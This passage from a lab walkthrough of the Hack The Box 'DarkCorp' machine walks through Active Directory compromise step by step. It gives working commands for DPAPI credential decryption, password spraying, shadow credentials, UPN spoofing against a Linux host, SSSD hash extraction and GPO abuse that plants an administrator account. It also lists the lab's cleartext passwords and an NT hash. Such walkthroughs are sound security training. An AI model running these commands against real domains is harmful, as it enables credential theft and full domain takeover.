+<p><code>Administrator | But_Lying_Aid9!</code></p>
+<p>And with this password, I can now decrypt the other masterkeys, and finally get the contents of that blob.</p>
+<p><code>attrib -H -S | Removes the hidden attribute from the specified file.</code></p>
+<p><img alt="download" src="../images/DarkCorp/download.png" /></p>
+<h3>Decrypting the masterkeys and the credential blob</h3>
+<p>I will use impacket-dpapi to work with the keys.</p>
+<p><code>impacket-dpapi masterkey -file &lt;key&gt; -sid S-1-5-21-2988385993-1727309239-2541228647-500 -password 'But_Lying_Aid9!' -dc-ip 172.16.20.1</code></p>
+<p><img alt="keys" src="../images/DarkCorp/keys.png" /></p>
+<p>2 out of the 3 masterkeys have been decrypted. I'll test those 2 against the credential blob.</p>
+<p><code>impacket-dpapi credential -file 32B2774DF751FF7E28E78AE75C237A1E -key &lt;decrypted key&gt;</code></p>
+<p><img alt="creds" src="../images/DarkCorp/creds.png" /></p>
+<p><code>? | Pack_Beneath_Solid9!</code></p>
+<h2>Password spraying</h2>
+<p>I discovered a new password, but no associated user. I'll perform password spraying against the domain with the 2 new passwords to check whether any of the users match a password.</p>
+<p><code>awk -F ' ' '{ print $5 }' userlist</code></p>
+<p><code>nxc smb 172.16.20.1 -u userlist1 -p passwordlist --continue-on-success</code></p>
+<p><img alt="johnw" src="../images/DarkCorp/johnw.png" /></p>
+<p><code>john.w | Pack_Beneath_Solid9!</code></p>
+<h2>John.W to Angela.W</h2>
+<p>Using bloodyAD, I checked John's permissions within the domain.</p>
+<p><code>bloodyAD -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' --dc-ip 172.16.20.1 get writable --detail</code></p>
+<p><img alt="genericwrite" src="../images/DarkCorp/genericwrite.png" /></p>
+<p>John can write into every attribute of Angela.W. In bloodhound, this would be visible as a <code>GenericWrite</code> edge.</p>
+<p>Since I know that ADCS is on the box, the quickest way to abuse it would be to use shadow credentials.</p>
+<p><code>certipy-ad shadow auto -account angela.w -dc-ip 172.16.20.1 -u john.w -p 'Pack_Beneath_Solid9!'</code></p>
+<p><img alt="angela" src="../images/DarkCorp/angela.png" /></p>
+<p><code>angela.w | 957246c8137069bca672dc6aa0af7c7a</code></p>
+<p>However, Angela herself doesn't have any useful permissions.</p>
+<h2>UPN Spoofing</h2>
+<p>Remembering that there were 2 accounts in the LinuxAdmins group, I began searching for a way to take advantage of a domain-joined Linux machine.</p>
+<p><code>https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/</code></p>
+<p>And eventually found this article, which explains a difference in authentication methods between Linux and Windows domain computers.</p>
+<p>The article explains this attack much better than I can, but in short, there is a difference in how users get validated:</p>
+<p>Windows uses SSPI, and the information within the PAC structure, which allows it to accurately identify the correct user belonging to a specific ticket.</p>
+<p>On the other hand, Unix systems use just GSSAPI, and look for the UPN to identify users. This is why it's vulnerable to UPN Spoofing.</p>
+<p>This means that if I can set the UPN of angela.w to a SamAccountName of a different user and request an NT_ENTERPRISE ticket, the Linux machine will check the UPN first, find angela.w.adm, and map to the target user.</p>
+<p><code>bloodyAD -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' --dc-ip 172.16.20.1 set object -v angela.w.adm angela.w userPrincipalName</code></p>
+<p><img alt="upn" src="../images/DarkCorp/upn.png" /></p>
+<p>After updating Angela's UPN, I requested an NT_ENTERPRISE ticket with imacpetk-getTGT.</p>
+<p><code>impacket-getTGT -hashes ':957246c8137069bca672dc6aa0af7c7a' -dc-ip 172.16.20.1 -principalType NT_ENTERPRISE darkcorp.htb/angela.w.adm</code></p>
+<p>SSH auth with this ticket failed even after enabling GSSAPIAuth, so I decided to transfer the ccache file onto the Linux machine.</p>
+<p><img alt="transfer" src="../images/DarkCorp/transfer.png" /></p>
+<p>While I cannot use <code>su</code> with this ticket to change users, <code>ksu</code> exists for that very reason.</p>
+<p>After exporting the ticket, I authenticated successfully.</p>
+<p><img alt="auth" src="../images/DarkCorp/auth.png" /></p>
+<h2>Investigating the System Security Services Daemon files(SSSD and SSS)</h2>
+<p>Since this is an AD-joined Linux machine, I decided to take a look at the files and directories related to SSSD.</p>
+<p><img alt="sss" src="../images/DarkCorp/sss.png" /></p>
+<p>I can see a few .ldb files in the /var/lib/sss/db directory. SSSD files can sometimes contain cached domain credentials, so these files seem like a prime target to check right now.</p>
+<p><code>strings * | grep '\$'</code></p>
+<p>I grepped for a dollar sign, because it is a stable component of most hashes encountered on Linux environments.</p>
+<p><img alt="unixhash" src="../images/DarkCorp/unixhash.png" /></p>
+<p>A single SHA5125 hash was found. I'll try cracking it with hashcat.</p>
+<p><img alt="cracked" src="../images/DarkCorp/cracked.png" /></p>
+<p><code>? | !QAZzaq1</code></p>
+<p>I have an idea as to whose password this might be, but to confirm it, I'll spray it against my user list from earlier.</p>
+<p><code>nxc smb 172.16.20.1 -u userlist1 -p '!QAZzaq1' --continue-on-success</code></p>
+<p><img alt="valid" src="../images/DarkCorp/valid.png" /></p>
+<p><code>taylor.b.adm | !QAZzaq1</code></p>
+<h2>Remote Group Policy Object abuse</h2>
+<p>As I remember from earlier, taylor.b.adm is in the <code>gpo_manager</code> group.</p>
+<p><img alt="gpo" src="../images/DarkCorp/gpo.png" /></p>
+<p>Taylor has FullControl over a certain GPO. To list all the GPOs existing on the domain, I'll use <code>ldapsearch</code></p>
+<p><img alt="ldap" src="../images/DarkCorp/ldap.png" /></p>
+<p>By comparing the GUIDs, I can tell that Taylor has FullControl over the <code>SecurityUpdates</code> policy. Windows Defender is most likely on, so I won't bother with trying to upload tools like SharpGPOAbuse.</p>
+<p>After a short search, I found a tool that can abuse GPOs remotely, without uploading anything to the DC itself.</p>
+<p><code>https://github.com/Hackndo/pyGPOAbuse</code></p>
+<p>Since I know the GPO and its ID, I have everything necessary to make use of this tool.</p>
+<p>When not specifying a command to execute, the tool's base usage involves creating a local admin user with credentials of <code>john:H4x00r123..</code></p>
+<p><code>python pygpoabuse.py darkcorp.htb/taylor.b.adm:'!QAZzaq1' -gpo-id "652CAE9A-4BB7-49F2-9E52-3361F33CE786"</code></p>
+<p><img alt="created" src="../images/DarkCorp/created.png" /></p>
+<p>To confirm that the user has been successfully created, I'll run <code>Get-ADUser</code> against John.</p>
+<p><img alt="confirm" src="../images/DarkCorp/confirm.png" /></p>
+<p>This confirms that John exists, and his <code>MemberOf</code> being <code>{CN=Administrators,CN=Builtin,DC=darkcorp,DC=htb}</code> confirms that I've successfully added an administrator account.</p>
+<p>Now all that's left is to remote into the DC as the local administrator. If, for some reason, John cannot remote, I'd just add him to the remote management users group.</p>
+<p><img alt="root" src="../images/DarkCorp/root.png" /></p>
+<p>Rooted!!!!!!</p>
             </div>
             
             <div class="toc-sidebar">
